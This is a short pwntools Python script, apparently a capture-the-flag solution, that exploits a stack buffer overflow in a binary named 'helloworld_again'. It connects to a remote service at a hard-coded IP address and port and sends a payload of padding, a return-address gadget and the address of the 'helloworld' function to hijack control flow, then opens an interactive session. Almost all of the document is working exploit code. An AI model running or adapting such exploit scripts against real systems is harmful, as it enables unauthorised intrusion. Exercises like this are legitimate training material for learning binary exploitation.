from pwn import *

context.terminal = 'terminator'
e = ELF('./helloworld_again')
r = remote('140.115.59.7', 10001)
#r = process('./helloworld_again')
payload = b'helloworld' + b'\x00'*(0x38-10)
payload += p64(0x4014ec)
payload += p64(e.symbols['helloworld'])
input('>')
r.sendline(payload)

r.interactive()
r.close()
